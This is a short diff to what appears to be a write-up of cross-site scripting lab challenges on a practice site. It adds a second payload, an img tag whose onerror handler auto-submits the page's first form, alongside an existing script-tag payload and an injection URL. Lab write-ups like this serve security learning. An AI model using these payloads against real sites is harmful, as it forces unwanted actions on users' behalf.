@@ -440,6 +440,8 @@ https://j4phjo6l.xssy.uk/target.ftl?name=%3Cscript%20nonce=%22rAnd0m%22%3Ealert(
 - **Payload**: 
 ```javascript
 <script>window.setTimeout(() => {document.forms[0].submit()}, 500)</script>
+Another payload:
+<img src=x onxss=c onerror="window.setTimeout(()=>{document.forms[0].submit()}, 500)">
 ```
 - **Full URL**: 
 ```
